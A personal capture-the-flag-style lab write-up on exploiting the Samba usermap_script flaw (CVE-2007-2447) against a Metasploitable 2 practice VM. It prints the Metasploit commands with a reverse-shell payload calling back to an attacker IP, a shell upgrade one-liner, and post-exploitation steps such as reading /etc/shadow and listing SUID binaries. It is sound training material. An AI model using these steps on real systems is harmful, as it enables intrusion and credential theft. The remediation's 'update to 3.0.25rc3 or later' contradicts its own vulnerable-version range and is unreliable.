# Lab 3 — Samba usermap_script Exploit

## Overview
- **Target:** Metasploitable 2
- **Target IP:** 192.168.56.101
- **Attacker IP:** 192.168.56.103
- **Date:** 2026-04-22
- **Difficulty:** Beginner

## Vulnerability
Samba versions 3.0.20 through 3.0.25rc3 contain a command injection
vulnerability in the username map script option. When this option is
enabled, passing shell metacharacters in the username field causes
arbitrary commands to be executed as root.

- **CVE:** CVE-2007-2447
- **Service:** Samba (SMB)
- **Port:** 139 / 445
- **Impact:** Unauthenticated remote code execution as root

---

## Enumeration
Identified the vulnerable Samba service via nmap:

```bash
nmap -sV 192.168.56.101
```

Output showed:
```
139/tcp open  netbios-ssn Samba smbd 3.X
445/tcp open  netbios-ssn Samba smbd 3.X
```

---

## Exploitation

Launched Metasploit and ran the module:

```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.101
set LHOST 192.168.56.103
set PAYLOAD cmd/unix/reverse
run
```

### Result
```
[*] Started reverse TCP double handler on 192.168.56.103:4444
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command shell session 1 opened (192.168.56.103:4444 -> 192.168.56.101:50104)
```

Confirmed root access immediately in the command shell:

```bash
whoami    # root
id        # uid=0(root) gid=0(root)
hostname  # metasploitable
```

### Key difference from Lab 2
Lab 2 (vsftpd) returned a Meterpreter session — standard Linux commands
like whoami did not work until running `shell` to drop into bash.

This exploit returned a raw command shell directly, so standard Linux
commands worked immediately with no extra steps needed.

---

## Upgrading to a Full TTY
Raw shells are limited — no tab completion, no clear, some commands
behave unexpectedly. Upgraded to a fully interactive bash shell with:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Prompt changed to:
```
root@metasploitable:/#
```

---

## Post-Exploitation

```bash
cat /etc/shadow                     # harvested hashed passwords
find / -perm -4000 2>/dev/null      # enumerated SUID binaries
netstat -tulnp                      # open ports from inside the machine
ps aux                              # all running processes
```

Note: SUID binaries run as their owner regardless of who executes them.
Any SUID binary owned by root is a potential privilege escalation vector.

---

## Lessons Learned
- Different exploits return different shell types — always check whether
  you have Meterpreter or a raw shell and adjust commands accordingly
- Raw shells should be upgraded to a full TTY with python pty as soon
  as possible for a better working environment
- The same target can be compromised through multiple unrelated services
- Internal netstat output reveals ports not visible from an outside scan

## Remediation
- Update Samba to a patched version (3.0.25rc3 or later)
- Disable the username map script option if not needed
- Restrict SMB ports 139 and 445 at the firewall
- Audit all services for unnecessary exposure
